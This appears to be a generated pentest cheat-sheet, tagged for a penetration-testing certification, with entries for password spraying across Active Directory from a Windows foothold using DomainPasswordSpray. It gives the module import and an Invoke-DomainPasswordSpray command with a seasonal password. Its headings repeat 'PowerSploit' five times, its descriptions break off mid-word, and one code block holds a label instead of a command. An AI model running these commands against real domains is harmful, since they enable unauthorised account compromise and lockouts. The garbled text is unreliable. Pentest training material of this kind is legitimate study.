# PowerSploit

% powersploit, cpts

## PowerSploit - PowerSploit - PowerSploit - PowerSploit - PowerSploit - internal-password-spraying-from-a-windows-host
#cat/ATTACK #cpts
From a foothold on a domain-joined Windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If we are authenticated to the domain, the tool will automatically gen

```
Import-Module .\DomainPasswordSpray.ps1
```

## PowerSploit - PowerSploit - PowerSploit - PowerSploit - PowerSploit - internal-password-spraying-from-a-windows-host-2
#cat/ATTACK #cpts
From a foothold on a domain-joined Windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If we are authenticated to the domain, the tool will automatically gen

```
Invoke-DomainPasswordSpray -Password Winter2022 -Outfile spraySuccess.txt -ErrorAction SilentlyContinue
```

## PowerSploit - PowerSploit - PowerSploit - PowerSploit - PowerSploit - using-domainpasswordsprayps1
#cat/ATTACK #cpts
Internal Password Spraying - from Windows

```
Confirm Password Spray
```

